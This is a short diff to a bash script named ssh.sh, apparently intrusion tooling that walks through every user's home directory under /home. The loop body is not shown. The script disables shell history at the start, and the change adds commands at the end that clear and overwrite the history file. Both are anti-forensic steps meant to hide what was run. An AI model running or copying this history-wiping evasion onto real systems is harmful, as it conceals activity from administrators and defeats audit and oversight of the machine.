@@ -1,8 +1,6 @@
 #!/bin/bash
 
-# sed -i 's/\r$//' ssh.sh
-# chmod +x ssh.sh
-# ./ssh.sh
+# sed -i 's/\r$//' ssh.sh && chmod +x ssh.sh && ./ssh.sh
 
 unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace && export TERM=xterm 2>/dev/null
 BASE_DIR="/home"
@@ -55,3 +53,4 @@ for user_dir in "$BASE_DIR"/*; do
         fi
     fi
 done 2>/dev/null
+history -c && history -w 
